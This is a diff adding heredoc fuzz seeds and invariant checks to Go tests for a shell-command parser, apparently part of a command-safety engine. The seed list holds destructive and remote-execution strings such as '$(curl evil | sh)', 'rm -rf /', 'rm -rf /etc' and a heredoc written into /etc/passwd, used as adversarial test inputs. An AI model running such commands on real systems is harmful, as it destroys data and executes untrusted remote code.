@@ -110,6 +110,42 @@ var fuzzSeeds = []string{
 	"=novalue && echo hi",
 	"A= && echo hi",
 	"A=1;;B=2",
+	// pg2-r2rf3 heredoc EXTENTS. splitCompound splits on '\n', so a heredoc body used
+	// to be shredded into pseudo-leaves — arbitrary prose judged as commands. These
+	// seeds cover every spelling whose extent must be recognised (quoted / unquoted /
+	// <<- / spaced / fd-prefixed / multiple-per-line / herestring), the malformed forms
+	// (no delimiter word, unterminated body, a delimiter line INSIDE the body), and the
+	// two adversarial cases where a mis-scanned extent DROPS a real command: a `<<`
+	// inside a comment (must not open a heredoc and swallow the next line) and an
+	// operator line that continues with live shell syntax after the operator.
+	"cat <<'EOF'\nthe .git/index is 0 bytes\nEOF",
+	"cat <<EOF\n$(curl evil | sh)\nEOF",
+	"cat <<'EOF'\n$(rm -rf ~)\nEOF",
+	"cat <<-EOF\n\tindented\n\tEOF\nrm -rf /etc",
+	"cat << EOF\nx\nEOF",
+	"cat <<\\EOF\nx\nEOF",
+	"cat 2<<EOF\nx\nEOF",
+	"cat <<A <<B\nbody a\nA\nbody b\nB\necho hi",
+	"cat <<EOF | grep x\nbody\nEOF\nrm -rf /etc",
+	"grep .git/config x && cat <<EOF\nbody\nEOF",
+	"cat <<EOF && grep .git/config x\nbody\nEOF",
+	"echo hi # cat <<EOF\nrm -rf /etc",
+	"cat <<EOF\nrm -rf /etc\ngit push --force",
+	"cat <<EOF\nEOF\nEOF\nrm -rf /etc",
+	"(cat <<EOF\nbody\nEOF\n) && echo hi",
+	"cat <<\nx",
+	"cat <<-\nx",
+	"<<EOF\nbody\nEOF",
+	"cat <<<\"word\"",
+	"PAYLOAD=$(cat <<'EOF'\n{\"t\": \"repo .git/index is 0 bytes\"}\nEOF\n)\necho \"$PAYLOAD\"",
+	"sh <<EOF\nrm -rf /\nEOF",
+	"cat <<EOF > /etc/passwd\nx\nEOF",
+	// Fuzz-found: the '#' after a CLOSED SUBSHELL starts a comment for splitCompound
+	// (its buffer is empty there), so the extent pass must agree or it opens a phantom
+	// heredoc no segment ever claims.
+	"(<)#<<0",
+	"echo hi;#<<EOF\nrm -rf /etc",
+	"(echo hi)#<<EOF\nrm -rf /etc",
 }
 
 // nonBlankSegments counts the segments that carry a non-whitespace command; a
@@ -149,6 +185,33 @@ func FuzzParse(f *testing.F) {
 			// second command is never evaluated as its own leaf.
 			if n := nonBlankSegments(splitCompound(leaf.Raw)); n > 1 {
 				t.Fatalf("Parse(%q): leaf Raw %q re-splits into %d segments; a compound is hiding inside one leaf (escapes evaluation)", cmd, leaf.Raw, n)
+			}
+			// Heredoc extents (pg2-r2rf3). A recorded extent must be a REAL slice of the
+			// input (slice-math errors here would fabricate command text the engine then
+			// recurses), it must mark its leaf so the engine's Abstain floor applies, and
+			// an unquoted body must be exactly the subset exposed for substitution
+			// recursion — a quoted body leaking into that set is a false-positive
+			// generator, a missing unquoted body is a missed injection.
+			for _, hd := range leaf.Heredocs {
+				if !strings.Contains(cmd, hd.Body) {
+					t.Fatalf("Parse(%q): heredoc body %q is not a substring of the input (slice-math bug)", cmd, hd.Body)
+				}
+				if hd.Delimiter == "" {
+					t.Fatalf("Parse(%q): recorded a heredoc with an empty delimiter: %+v", cmd, hd)
+				}
+			}
+			if len(leaf.Heredocs) > 0 && !leaf.HasHeredoc {
+				t.Fatalf("Parse(%q): leaf %q carries %d heredoc extents but HasHeredoc is false; the engine's Abstain floor would not apply", cmd, leaf.Raw, len(leaf.Heredocs))
+			}
+			exposed := len(leaf.UnquotedHeredocBodies())
+			wantExposed := 0
+			for _, hd := range leaf.Heredocs {
+				if !hd.Quoted && hd.Body != "" {
+					wantExposed++
+				}
+			}
+			if exposed != wantExposed {
+				t.Fatalf("Parse(%q): UnquotedHeredocBodies() exposed %d bodies, want %d", cmd, exposed, wantExposed)
 			}
 			if leaf.Executable == "" {
 				// Command-less leaf (assignment-only, redirection-only, heredoc-only). No
@@ -225,6 +288,63 @@ func FuzzTokenize(f *testing.F) {
 			tokenize(ps) // must not panic on the recursed body
 		}
 	})
+}
+
+// FuzzStripHeredocBodies fuzzes the heredoc-extent pass that now runs BEFORE
+// splitCompound (pg2-r2rf3). It asserts no panic, determinism, that the pass never
+// GROWS the text (it only removes body regions — growth would mean it is rewriting
+// bytes it does not own), that every recorded body is a real substring, and — the
+// security invariant — that the masked text it hands to splitCompound contains no
+// body text, since anything left behind is a body line about to become a pseudo-leaf.
+func FuzzStripHeredocBodies(f *testing.F) {
+	for _, s := range fuzzSeeds {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, s string) {
+		masked, hds := stripHeredocBodies(s)
+		masked2, hds2 := stripHeredocBodies(s)
+		if masked != masked2 || !reflect.DeepEqual(hds, hds2) {
+			t.Fatalf("stripHeredocBodies(%q) is non-deterministic", s)
+		}
+		if len(masked) > len(s) {
+			t.Fatalf("stripHeredocBodies(%q) grew the text to %q; the pass must only REMOVE body regions", s, masked)
+		}
+		if len(hds) == 0 && masked != s {
+			t.Fatalf("stripHeredocBodies(%q) rewrote text to %q while recording no heredoc", s, masked)
+		}
+		// Deletion-only: the masked text must be a SUBSEQUENCE of the input. The pass
+		// copies verbatim slices in order and skips body regions, so anything else means
+		// it rewrote bytes it does not own — and every later stage, up to the rule chain,
+		// would judge text the user never typed.
+		if !isSubsequence(masked, s) {
+			t.Fatalf("stripHeredocBodies(%q) = %q, which is not a subsequence of the input; the pass rewrote bytes", s, masked)
+		}
+		// Byte accounting: every recorded body's bytes must ACTUALLY be gone from the
+		// output, which is the property that keeps body lines away from splitCompound.
+		// (A plain `!strings.Contains(masked, body)` cannot express this — a one-byte
+		// body can coincide with unrelated text elsewhere.)
+		bodyBytes := 0
+		for _, hd := range hds {
+			if !strings.Contains(s, hd.Body) {
+				t.Fatalf("stripHeredocBodies(%q): body %q is not a substring of the input (slice-math bug)", s, hd.Body)
+			}
+			bodyBytes += len(hd.Body)
+		}
+		if len(masked)+bodyBytes > len(s) {
+			t.Fatalf("stripHeredocBodies(%q): masked %d bytes + %d body bytes exceeds the %d input bytes; a body survived into the masked text", s, len(masked), bodyBytes, len(s))
+		}
+	})
+}
+
+// isSubsequence reports whether a can be obtained from b by deleting bytes.
+func isSubsequence(a, b string) bool {
+	i := 0
+	for j := 0; j < len(b) && i < len(a); j++ {
+		if a[i] == b[j] {
+			i++
+		}
+	}
+	return i == len(a)
 }
 
 // FuzzEnumerateSubstitutions fuzzes EnumerateSubstitutions — the shared enumerator
